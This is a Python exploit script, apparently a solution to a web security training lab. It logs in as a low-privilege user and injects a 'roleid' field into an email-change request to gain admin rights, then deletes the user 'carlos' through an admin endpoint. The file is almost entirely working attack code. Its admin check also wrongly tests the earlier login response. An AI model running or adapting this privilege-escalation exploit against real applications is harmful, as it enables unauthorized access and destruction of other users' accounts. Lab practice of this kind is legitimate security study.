import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}



    

def delete_user(s, url):
    #Login as the normal user
    login_url= url + "/login"
    data_login= {"username": "wiener", "password": "peter"}
    r= s.post(login_url, data= data_login, verify=False, proxies=proxies)
    res= r.text
    if "Log out" in res:
        print("You are logged in sucessfully")

        #Change the role id of the user 
        change_email_url = url + "/my-account/change-email"
        data_role_change = {"email":"babyhacker3@gmail.com","roleid":2}
        r=s.post(change_email_url, json=data_role_change, verify=False, proxies=proxies)
        if "Admin" in res:
            print("Your role has been changed to admin")

            #Delete the Carlos User
            delete_user_url= url + "/admin/delete?username=carlos"
            r=s.get(delete_user_url, verify=False, proxies=proxies)

            if r.status_code == 200:
                print("user successfully deleted")
            else:
                print("User not deleted")
                sys.exit(-1)
        else:
            print("Your role has not been changed")
            sys.exit(-1)
    else:
        print("login unsuccessful")
        sys.exit(-1)






def main():
    if len(sys.argv) !=2:
        print("Usage: %s <url>" % sys.argv[0])
        print("Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    print("Deleting the user")
    delete_user(s, url)



if __name__== "__main__":
    main()
